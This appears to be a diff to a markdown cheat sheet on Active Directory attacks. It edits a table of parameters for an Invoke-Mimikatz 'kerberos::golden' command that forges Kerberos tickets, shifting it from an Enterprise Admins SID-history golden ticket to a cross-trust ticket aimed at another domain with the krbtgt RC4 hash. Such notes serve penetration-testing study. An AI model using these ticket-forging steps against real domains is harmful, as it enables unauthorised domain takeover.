@@ -28,9 +28,10 @@ Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:corp.loc
 |:-------------------------------------------------:|:----------------------------------------------:|
 | /domain:sub.corp.local                            | Current Domain FQDN                            |
 | /sid:S-1-5-21-268341927-4156873456-1784235843     | Current Domain SID                             |
-| /sids:S-1-5-21-280534878-1496970234-700767426-519 | SID of Enterprise Admins group (Parent Domain) |
 | /user:Administrator                               | User to impersonate                            |
-| /krbtgt:a9b30e5b0dc865eadcea9411e4ade72d          | krbtgt hash of Current Domain                  |
+| /rc4:a9b30e5b0dc865eadcea9411e4ade72d             | krbtgt hash of Current Domain                  |
+| /service:krbtgt                                   | krbtgt service to abuse                        |
+| /target:extcorp.local                             | Target domain                                  |
 | /tiket:C:\Windows\Temp\trust_tkt.kirbi            | File to store the ticket                       |
 
 
